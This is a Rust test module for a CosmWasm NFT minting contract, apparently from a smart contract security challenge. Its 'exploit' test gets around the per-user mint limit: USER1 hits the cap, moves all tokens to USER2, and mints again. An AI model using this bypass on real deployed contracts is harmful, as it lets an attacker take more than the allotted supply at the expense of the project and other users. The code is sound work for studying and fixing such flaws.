#[cfg(test)]
mod tests{
    use cosmwasm_std::{Addr, Empty};
    use cw721::TokensResponse;
    use cw_multi_test::Executor;

    use crate::{
        integration_tests::tests::{proper_instantiate, USER1, USER2},
        msg::{ExecuteMsg, QueryMsg},
        state::Config,
    };
    use cw721_base::{ExecuteMsg as Cw721ExecuteMsg, QueryMsg as Cw721QueryMsg};
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        // query config
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();

        // mint to whitelisted user until max limit
        assert_eq!(config.mint_per_user, 3);

        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();

        // exceed max limit fails
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap_err();

        // other users can mint freely
  
        let tokens_res: TokensResponse = app
        .wrap()
        .query_wasm_smart(
            config.nft_contract.clone(),
            &Cw721QueryMsg::Tokens::<Empty> {
                owner: USER1.to_owned(),
                start_after: None,
                limit: None,
            },
        )
        .unwrap();

        for token_id in tokens_res.tokens {
            app.execute_contract(
                Addr::unchecked(USER1),
                config.nft_contract.clone(),
                &Cw721ExecuteMsg::TransferNft::<Empty, Empty> {
                    recipient: USER2.to_owned(),
                    token_id: token_id.to_string(),
                },
                &[],
            )
            .unwrap();
        }

        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();
    }
}